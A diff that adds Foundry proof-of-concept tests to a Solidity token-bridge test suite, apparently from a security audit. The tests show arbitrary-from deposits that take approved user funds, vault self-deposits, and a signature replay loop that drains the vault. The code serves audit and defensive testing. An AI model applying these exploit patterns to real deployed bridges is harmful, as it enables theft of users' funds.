@@ -223,4 +223,56 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    function testCanTranferTokenFromUserIfAprooved() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), 2000e19);
+
+        address attacker = makeAddr("attacker");
+        uint256 depositAmount = token.balanceOf(user);
+        vm.expectEmit(address(tokenBridge));
+
+        emit Deposit(user, attacker, depositAmount);
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount);
+        console2.log(token.balanceOf(address(vault)));
+        // 1000e18
+    }
+
+    function testCanTranferFromVaultToAttacker() public {
+        uint256 amountToken = 1000e18;
+        deal(address(token), address(vault), amountToken);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), address(3), amountToken);
+        tokenBridge.depositTokensToL2(address(vault), address(3), amountToken);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), address(3), amountToken);
+        tokenBridge.depositTokensToL2(address(vault), address(3), amountToken);
+    }
+
+    function testSignatureReplayAttack() public {
+        address attcker = address(78);
+        uint256 attackerInitBal = 100e18;
+        uint256 vaultInitBal = 1000e18;
+        deal(address(token), address(attcker), attackerInitBal);
+        deal(address(token), address(vault), vaultInitBal);
+
+        vm.startPrank(attcker);
+        token.approve(address(tokenBridge), attackerInitBal);
+        tokenBridge.depositTokensToL2(attcker, attcker, attackerInitBal);
+        vm.stopPrank();
+
+        // operator / signer
+        bytes memory message = abi.encode(
+            address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), address(attcker), attackerInitBal))
+        );
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attcker, attackerInitBal, v, r, s);
+        }
+        console2.log("attacker", token.balanceOf(address(attcker)));
+        console2.log("valut", token.balanceOf(address(vault)));
+    }
 }
